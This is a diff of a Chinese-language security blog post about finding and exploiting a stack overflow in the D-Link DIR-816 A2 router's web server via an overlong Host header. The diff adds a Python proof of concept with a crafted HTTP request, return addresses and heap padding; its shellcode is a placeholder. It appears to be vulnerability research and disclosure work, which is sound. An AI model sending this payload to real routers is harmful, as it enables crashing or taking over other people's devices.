@@ -10,7 +10,7 @@ published: true
 
 在 [sakura](http://eternalsakura13.com/) 师傅的指导下开始尝试挖掘路由器的漏洞。
 
-本文描述了作者对 Dlink DIR-816 型号的路由器固件进行分析从触发 crash 到完整的漏洞利用过程，漏洞已提交厂商，
+本文描述了作者对 Dlink DIR-816 A2 型号的路由器固件进行分析从触发 crash 到完整的漏洞利用过程，漏洞已提交厂商，
 尚未获得厂商回复，安全起见这里只描述一下思路，不放出最终漏洞利用代码。
 
 之前尝试 qemu 模拟路由器 web 服务运行达不到较好的效果，大部分无法直接运行。按照 0day 路由器那本书上的第一个
@@ -21,6 +21,7 @@ totolink 的一款路由，环境修复后发现可以正常运行，尝试发�
 
 # Firmware Analysis - trigger crash
 
+从 [Dlink官网](http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-816) 下载A2型号最新版本的固件，
 对固件进行解包后浏览了下目录，发现 goahead web应用程序，直接开始逆向分析，从 main 函数入手，想着先找一个 auth
 bypass 试试。这里不得不称赞一下ida pro，用 radare2 和 ida pro 分别分析了一下，ida 体现出了它符号分析与字符串
 关联的强大之处，用 radare2 进行分析遇到变量之间进行计算之后得到的数据地址如一些字符串无法标注出来，甚至有些
@@ -36,7 +37,7 @@ bypass 试试。这里不得不称赞一下ida pro，用 radare2 和 ida pro 分
 看了下发现其实是删掉了 telnetd，无法直接连上去然后传一个 gdbserver 上去 attach web 进程。不过它的上一个版本有
 telnetd，就换成了旧的版本，至于新版本是否修补了旧版本的漏洞暂时不管，只想体验一下成功调试的感觉 T-T。
 
-固件更换完之后 telnet 连上去空密码登录，tftp 传一个
+固件更换完之后设置开启telnetd，然后telnet 连上去空密码登录，tftp 传一个
 [gdbserver](https://github.com/rapid7/embedded-tools/tree/master/binaries/gdbserver) ，github 上的这个 7.8 版本
 莫名的好用，反而自己重新编译了跟自己 gdb 版本一致的连上去出错。
 
@@ -71,12 +72,16 @@ telnetd，就换成了旧的版本，至于新版本是否修补了旧版本的�
 
 分析到这里想尝试一下 fuzz 顺便也可以学习一下，在上工具之前先手动 fuzz 了一下，对不同字段进行加长，看看会不会
 发生像之前做的实验一样 cookie 过长发生缓冲区溢出了。在试了一通几万字节的字符串无果之后对溢出暂时放下了，回过头来
-继续分析程序逻辑，看看之前 Host 字段判断本地具体逻辑，发现好像直接触发 websRedirect Url 跳转了，具体细节会在
-之后全面分析的时候补上，因为马上 Host 字段就立功了。
+继续分析程序逻辑，看看之前 Host 字段判断本地具体逻辑，发现好像直接触发 websRedirect Url 跳转了。
 
 然后在没有什么思路的情况下对各种 Url 各种字段尝试，由于一直对 Host 字段耿耿于怀，就对 Host 字段构造了超长字符
 串，然后请求认证成功后才能访问的页面这样会触发 Url 跳转，在这里面的逻辑中由于未对复制到栈上的字符串长度进行
 限制而产生了栈缓冲区溢出触发了 Crash !!!
+
+来看一下这个 crash 的位置，经过分析漏洞代码是 websRedirect　函数中位于 `0x41EAE4`　位置处的一段代码，对字符串
+复制没有长度限制，只是判断遇到空字节或者换行符结束。
+
+![]({{site.baseurl}}/images/18-5-11-8.png)
 
 # Exploitation
 
@@ -97,7 +102,50 @@ shell 的 shellcode。
 最后是发送了超过 64k 字节大小的 http 请求才在堆上分配了一块内存放置 shellcode 执行成功了，幸运的是最新版本的
 固件也存在这个漏洞。
 
-测试结果：
+验证一下poc代码：
+
+```
+# Tested product: DIR-816 (CN)
+# Hardware version: A2
+# Firmware version: v1.10B05 (2018/01/04)
+# Firmware name: DIR-816A2_FWv1.10CNB05_R1B011D88210.img
+#
+
+import socket
+
+p = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                 
+p.connect(("192.168.0.1" , 80))
+
+shellcode = "A"*0x200   # *** Not the correct shellcode for exploit ***
+
+rn = "\r\n"
+strptr = "\x60\x70\xff\x7f"
+padding = "\x00\x00\x00\x00"
+
+payload = "GET /sharefile?test=A" + "HTTP/1.1" + rn
+payload += "Host: " + "A"*0x70 + strptr*2 + "A"*0x24  + "\xb8\xfe\x48" + rn
+payload += "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0" + rn
+payload += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
+payload += "Accept-Language: en-US,en;q=0.5" + rn
+payload += "Accept-Encoding: gzip, deflate" + rn
+payload += "Cookie: curShow=; ac_login_info=passwork; test=A" + padding*0x200 + shellcode + padding*0x4000 + rn
+payload += "Connection: close" + rn
+payload += "Upgrade-Insecure-Requests: 1" + rn
+payload += rn
+
+p.send(payload)
+print p.recv(4096)
+```
+
+断在堆上的地址 `0x48feb8`　处：
+
+![]({{site.baseurl}}/images/18-5-11-8.png)
+
+运行poc：
+
+![]({{site.baseurl}}/images/18-5-11-9.png)
+
+完整 shellcode 测试结果：
 
 ![]({{site.baseurl}}/images/18-5-11-6.png)
 
@@ -105,7 +153,7 @@ shell 的 shellcode。
 
 # Summary
 
-这里暂时对整个过程的思路进行简单描述，后续会补上详细的分析。这个漏洞的影响貌似没有那么广，shodan 和 zoomeye
+这个漏洞的影响貌似没有那么广，shodan 和 zoomeye
 看了下公网没有找到这个型号的路由开放 web 服务，也许是因为默认的配置只在子网中开放 web 服务。
 然后比较奇怪的是 D Link 只在中国区找的到这个型号的路由，国外官网貌似没有这款路由
 emm.. 希望这能算是挖到漏洞吧 0.0。最后，感谢对我悉心指导的 sakura 师傅，也希望漏洞能提交成功 QVQ 。
